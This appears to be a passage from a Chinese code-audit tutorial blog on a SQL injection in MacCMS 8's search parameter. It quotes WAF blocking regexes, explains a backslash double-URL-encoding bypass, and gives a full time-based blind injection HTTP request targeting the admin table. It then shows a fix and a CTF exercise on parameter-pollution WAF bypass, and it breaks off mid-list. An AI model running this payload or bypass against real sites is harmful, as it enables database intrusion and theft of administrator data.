<p>我们跟进一下 <strong>$getfilter</strong> 变量。该变量在 <strong>inc\common\360_safe3.php</strong> 文件中，我们截取部分相关代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//get拦截规则</span></span><br><span class="line"><span class="variable">$getfilter</span> = <span class="string">&quot;\\&lt;.+javascript:window\\[\\].*\\&gt;|&lt;.*(&amp;#\\d+;)+?&gt;|&lt;.*(data|src)=data:text\\/html.*?&gt;|\\b(alert\\|confirm\\|expression\\|prompt\\|benchmark.*?|sleep.*?|group_concat\\).*?\\b(load_file|benchmark|[a-z]&#123;4,&#125;)\\b|\\bon\\w+=[^&gt;]+\\&gt;|SELECT\\s+(.*.)+\\b\\@&#123;1,2&#125;\\s+.*|SET\\s+.*\\b;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//post拦截规则</span></span><br><span class="line"><span class="variable">$postfilter</span> = <span class="string">&quot;&lt;.*=&amp;(#\\d+;)?&gt;.*(alert\\|confirm\\|expression\\|prompt\\|benchmark.*?|sleep.*?|group_concat\\).*?\\b(load_file|benchmark)\\b|\\bon\\w+=[^&gt;]+\\&gt;|\\bEXEC\\b|UNION\\s+SELECT.*|INSERT\\s+INTO.*VALUES\\s*(\\(.*)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//cookie拦截规则</span></span><br><span class="line"><span class="variable">$cookiefilter</span> = <span class="string">&quot;benchmark.*?|\\b(load_file|exec|SELECT|INSERT|DELETE|CREATE|ALTER|DROP|TRUNCATE|\\@\\@)\\b.*?VALUES\\(.*|SET\\s+.*&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这串代码的功能显而易见，就是检测 <strong>GET，POST，COOKIE</strong> 中的恶意数据。刚刚在 <strong>chkSql()</strong> 函数最后有串代码是： <strong>return htmlEncode($s);</strong> ，我们跟进一下 <strong>htmlEncode</strong> 函数。该函数位置在 <strong>inc\common\function.php</strong> 文件中，相关代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmlEncode</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">isN</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">38</span>), <span class="string">&quot;&amp;#38;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">39</span>), <span class="string">&quot;&amp;#39;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">32</span>), <span class="string">&quot;&amp;nbsp;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">34</span>), <span class="string">&quot;&amp;quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">9</span>), <span class="string">&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">13</span>), <span class="string">&quot;&lt;br /&gt;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>), <span class="string">&quot;&lt;br /&gt;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码的功能是针对 <strong>&amp;</strong> 、 <strong>‘</strong> 、 <strong>空格</strong> 、 <strong>“</strong> 、 <strong>TAB</strong> 、 <strong>回车</strong> 、 <strong>换行</strong> 、 <strong>大于小于号</strong> 等符号进行实体编码转换。但是这里百密一疏，没有针对其他的空白字符和反斜杠进行处理。这里先埋下一个伏笔，我们继续往下看。</p>
<p>首先注入点是在 <strong>inc\common\template.php</strong> ，相关代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$where</span> .= <span class="string">&#x27; AND ( instr(a_name,\&#x27;&#x27;</span>.<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>].<span class="string">&#x27;\&#x27;)&gt;0 or instr(a_subname,\&#x27;&#x27;</span>.<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>].<span class="string">&#x27;\&#x27;)&gt;0 ) &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们继续看看这个 <strong>$lp[‘wd’]</strong> 的值是怎么获取的，在 <strong>inc\common\template.php</strong> 文件中找到其相关代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;vod&#x27;</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;order&quot;</span>])) &#123; <span class="variable">$lp</span>[<span class="string">&#x27;order&#x27;</span>] = <span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;order&quot;</span>]; <span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;auto&quot;</span>] = <span class="literal">true</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;by&quot;</span>])) &#123; <span class="variable">$lp</span>[<span class="string">&#x27;by&#x27;</span>] = <span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;by&quot;</span>]; <span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;auto&quot;</span>] = <span class="literal">true</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$lp</span>[<span class="string">&#x27;pagesize&#x27;</span>]))&#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;wd&quot;</span>])) &#123; <span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>] = <span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;wd&quot;</span>]; <span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;auto&quot;</span>] = <span class="literal">true</span>; &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>上图 <strong>第13行</strong> ，当 <strong>P[‘wd’]</strong> 不为空的时候， <strong>$lp[‘wd’]</strong> 是从 <strong>P[“wd”]</strong> 中获取到数据的。根据前面我们的分析，在 <strong>inc\module\vod.php</strong> 文件中的存在这样一行代码： <strong>$tpl-&gt;P[“wd”] &#x3D; $wd;</strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>(<span class="variable">$method</span>==<span class="string">&#x27;search&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$tpl</span>-&gt;C[<span class="string">&quot;siteaid&quot;</span>] = <span class="number">15</span>;</span><br><span class="line">    <span class="variable">$wd</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">be</span>(<span class="string">&quot;all&quot;</span>, <span class="string">&quot;wd&quot;</span>)); </span><br><span class="line">    <span class="variable">$wd</span> = <span class="title function_ invoke__">chkSql</span>(<span class="variable">$wd</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$wd</span>)) &#123;</span><br><span class="line">        <span class="variable">$tpl</span>-&gt;P[<span class="string">&quot;wd&quot;</span>] = <span class="variable">$wd</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而 <strong>wd</strong> 是可以从 <strong>REQUEST</strong> 中获取到，所以这里的 <strong>wd</strong> 实际上是可控的。</p>
<h3 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>现在我们需要针对漏洞进行验证工作，这就涉及到POC的构造。在前面分析中，我们知道 <strong>htmlEncode</strong> 针对 <strong>&amp;</strong> 、 <strong>‘</strong> 、 <strong>空格</strong> 、 <strong>“</strong> 、 <strong>TAB</strong> 、 <strong>回车</strong> 、 <strong>换行</strong> 、 <strong>大于小于号</strong> 进行实体编码转换。但是这里的注入类型是字符型注入，需要引入单引号来进行闭合，但是 <strong>htmlEncode</strong> 函数又对单引号进行了处理。因此我们可以换个思路。</p>
<p>我们看到注入攻击的时候，我们的 <strong>$lp[‘wd’]</strong> 参数可以控制SQL语句中的两个位置，因此这里我们可以通过引入 <strong>反斜杠</strong> 进行单引号的闭合，但是针对前面的分析我们知道其调用了 <strong>addslashes</strong> 函数进行转义处理，而 <strong>addslashes</strong> 会对 <strong>反斜杠</strong> 进行处理，但是这里对用户请求的参数又会先进行 <strong>url解码</strong> 的操作，因此这里可以使用 <strong>双url编码</strong> 绕过 <strong>addslashes</strong> 函数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$where</span> .= <span class="string">&#x27; AND ( instr(a_name,\&#x27;&#x27;</span> . <span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>] . <span class="string">&#x27;\&#x27;)&gt;0 or instr(a_subname,\&#x27;&#x27;</span> . <span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>] . <span class="string">&#x27;\&#x27;)&gt;0 ) &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/maccms8/index.php?m=vod-search</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>98</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-mel">wd=))||<span class="keyword">if</span>((<span class="keyword">select</span>%0b(<span class="keyword">select</span>(m_name)<span class="string">``</span>from(mac_manager))regexp(<span class="number">0x5e61</span>)),(<span class="string">`sleep`</span>(<span class="number">3</span>)),<span class="number">0</span>)#%25%35%63</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-17.png"></p>
<p>payload传到程序里，经过拼接后的数据库语句如下所示：</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-18.png"></p>
<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><strong>核心问题点</strong></p>
<ol>
<li><p><strong>用户输入未经充分验证与过滤</strong>：</p>
<ul>
<li>问题的核心在于用户输入（通过<code>$lp[&#39;wd&#39;]</code>）被直接用于SQL查询构建，而没有进行严格的检查和限制。</li>
<li>尽管输入经过了<code>chkSql()</code>的初步处理，包括URL解码和<code>StopAttack()</code>的安全过滤，但这些措施未能完全避免SQL注入的风险。</li>
</ul>
</li>
<li><p><strong>使用<code>addslashes()</code>的不足</strong>：</p>
<ul>
<li><code>be()</code>函数使用<code>addslashes()</code>来转义输入数据。但<code>addslashes()</code>对于单字节字符集环境可能足够，对于多字节字符集如UTF-8，这种转义方法可能被绕过。</li>
<li>在某些特定情况下，双重URL编码可以绕过<code>addslashes()</code>的转义，导致注入攻击的可能。</li>
</ul>
</li>
<li><p><strong>不恰当的SQL查询构建方式</strong>：</p>
<ul>
<li>SQL查询通过字符串拼接构建，其中直接插入了用户控制的变量<code>$lp[&#39;wd&#39;]</code>。这种方式在没有严格的输入验证和适当的转义机制的情况下，极易导致SQL注入。</li>
</ul>
</li>
<li><p><strong>安全函数<code>htmlEncode()</code>的不足</strong>：</p>
<ul>
<li>该函数主要对HTML特殊字符进行编码，但在阻止SQL注入方面作用有限。</li>
<li>SQL注入需要针对SQL语法特征进行专门的处理，而非仅仅是HTML编码。</li>
</ul>
</li>
</ol>
<p>这里的防御手段其实已经很多了，但就是因为这么多防御手段结合在一起出现了有趣的绕过方式。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmlEncode</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="title function_ invoke__">isN</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line">		<span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">38</span>), <span class="string">&quot;&amp;#38;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">		<span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">		<span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">		<span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">39</span>), <span class="string">&quot;&amp;#39;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">		<span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">32</span>), <span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">		<span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">34</span>), <span class="string">&quot;&amp;quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">		<span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">9</span>), <span class="string">&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">		<span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">13</span>), <span class="string">&quot;&lt;br /&gt;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">		<span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>), <span class="string">&quot;&lt;br /&gt;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">92</span>), <span class="string">&quot;&lt;br /&gt;&quot;</span>,<span class="variable">$str</span>);      <span class="comment">//新增修复代码</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反斜杠的ascii码是92，这里新增一行代码处理反斜杠。</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-19.png"></p>
<h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;db.inc.php&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">dhtmlspecialchars</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line">          <span class="keyword">foreach</span> (<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">              <span class="variable">$string</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">dhtmlspecialchars</span>(<span class="variable">$val</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;&amp;amp;&#x27;</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>, <span class="string">&#x27;（&#x27;</span>, <span class="string">&#x27;）&#x27;</span>), <span class="variable">$string</span>);</span><br><span class="line">          <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$string</span>, <span class="string">&#x27;&amp;amp;#&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">              <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&amp;amp;((#(\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/&#x27;</span>, <span class="string">&#x27;&amp;\\1&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">dowith_sql</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">      <span class="variable">$check</span> = <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/select|insert|update|delete|\&#x27;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/is&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$check</span>) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;非法字符!&quot;</span>;</span><br><span class="line">          <span class="keyword">exit</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 经过第一个waf处理</span></span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">      <span class="variable">$_REQUEST</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">dowith_sql</span>(<span class="variable">$value</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 经过第二个WAF处理</span></span><br><span class="line">  <span class="variable">$request_uri</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;?&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$request_uri</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">      <span class="variable">$rewrite_url</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;&amp;&quot;</span>, <span class="variable">$request_uri</span>[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="variable">$rewrite_url</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">          <span class="variable">$_value</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;=&quot;</span>, <span class="variable">$value</span>);</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_value</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">              <span class="variable">$_REQUEST</span>[<span class="variable">$_value</span>[<span class="number">0</span>]] = <span class="title function_ invoke__">dhtmlspecialchars</span>(<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_value</span>[<span class="number">1</span>]));</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 业务处理</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">      <span class="variable">$user_id</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;i_d&#x27;</span>];</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;select * from ctf.users where id=<span class="subst">$user_id</span>&quot;</span>;</span><br><span class="line">      <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">      <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&quot;</span>;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>对于传入的非法的 <strong>$_GET</strong> 数组参数名，PHP会将他们替换成 <strong>下划线</strong> 。经过fuzz，有以下这些字符：</li>
</ul>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-20.png"></p>
<ul>
<li>当我们使用HPP（HTTP参数污染）传入多个相同参数给服务器时，PHP只会接收到后者的值。（这一特性和中间件有关系）</li>
</ul>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-21.png"></p>
<ul>
<li>通过 <strong>$_SERVER[‘REQUEST_URI’]</strong> 方式获得的参数，并不会对参数中的某些特殊字符进行替换。</li>
</ul>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-22.png"></p>
<p>这里的代码中有两个waf。</p>
<p>第一个WAF在代码 <strong>第29行-第30行</strong> ，这里面采用了 <strong>dowith_sql()</strong> 函数，跟进一下 <strong>dowith_sql()</strong> 函数，该函数主要功能代码在 <strong>第19-第26行</strong> ，如果 <strong>$_REQUEST</strong> 数组中的数据存在 <strong>select|insert|update|delete</strong> 等敏感关键字或者是字符，则直接 <strong>exit()</strong> 。如果不存在，则原字符串返回。</p>
<p>而第二个WAF在代码 <strong>第33行-第39行</strong> ，这部分代码通过 <strong>$_SERVER[‘REQUEST_URI’]</strong> 的方式获取参数，然后使用 <strong>explode</strong> 函数针对 <strong>&amp;</strong> 进行分割，获取到每个参数的参数名和参数值。然后针对每个参数值调用 <strong>dhtmlspecialchars()</strong> 函数进行过滤。</p>
<p>跟进一下 <strong>dhtmlspecialchars()</strong> 函数，发现其相关功能代码在 <strong>第3行-第14行</strong> ，这个函数主要功能是针对 <strong>‘&amp;’, ‘“‘, ‘&lt;’, ‘&gt;’, ‘(‘, ‘)’</strong> 等特殊字符进行过滤替换，最后返回替换后的内容。从 <strong>第44行和第45行</strong> 的代码中，我们可以看到这题的参数都是通过 <strong>REQUEST</strong> 方式获取。我们可以先来看个例子：</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-23.png"></p>
<p>第一次 <strong>$_REQUEST</strong> 仅仅只会输出 <strong>i_d&#x3D;2</strong> 的原因是因为php自动将 <strong>i.d</strong> 替换成了 <strong>i_d</strong> 。而根据我们前面说的第二个特性，PHP取最后一个参数对应的值，因此第一次 <strong>$_REQUEST</strong> 输出的是2。</p>
<p>第二次 <strong>$_REQUEST</strong> 会输出 <strong>i_d&#x3D;select&amp;i.d&#x3D;2</strong> 是因为 <strong>$_SERVER[‘REQUEST_URI’]</strong> 并不会对特殊的符号进行替换，因此结果会原封不动的输出。所以这题的payload可以根据下面这个思维导图进行构造：<br><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-24.png"></p>
<ul>
<li>我们通过页面请求 <strong>i_d&#x3D;padyload&amp;i.d&#x3D;123</strong> 。</li>
<li>当数据流到达第一个WAF时，php会将参数中的某些特殊符号替换为下划线。因此便得到了两个 <strong>i_d</strong> ，所以此时的payload变成了 <strong>i_d&#x3D;payload&amp;i_d&#x3D;123</strong> 。</li>
